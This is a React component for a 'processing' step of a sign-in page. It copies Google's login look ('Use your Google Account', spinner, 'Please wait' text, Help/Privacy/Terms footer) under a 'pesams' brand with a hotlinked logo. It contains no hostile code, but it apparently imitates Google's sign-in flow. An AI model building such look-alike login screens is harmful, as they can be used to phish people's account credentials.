import "./SignIn.css";

function ProcessingStep() {


  return (
      <div className="signin-page">

      <div className="signin-card">

        {/* TOP LOADING ANIMATION */}

          <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        

        {/* LEFT SIDE */}
        <div className="signin-left">

          <div className="pesams-brand">
 
            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1>
            Sign in
          </h1>

          <p className="signin-subtitle">
            Use your Google Account
          </p>

        </div>


        {/* RIGHT SIDE */}
        <div className="signin-right">
              <div className="processing-spinner">
             <div className="spinner-circle"></div>
           </div>

           <h1 className="processing-title">
             Please wait
           </h1>

           <p className="processing-text">
             We are processing your request.
             Please wait while we continue.
           </p>

        
        </div>

      </div>


      {/* FOOTER */}
      <footer className="signin-footer">

        <button className="language-button">
          English
          <span>⌄</span>
        </button>

        <div className="footer-links">

          <button type="button">
            Help
          </button>

          <button type="button">
            Privacy
          </button>

          <button type="button">
            Terms
          </button>

        </div>

      </footer>

    </div>
  );
}

export default ProcessingStep;



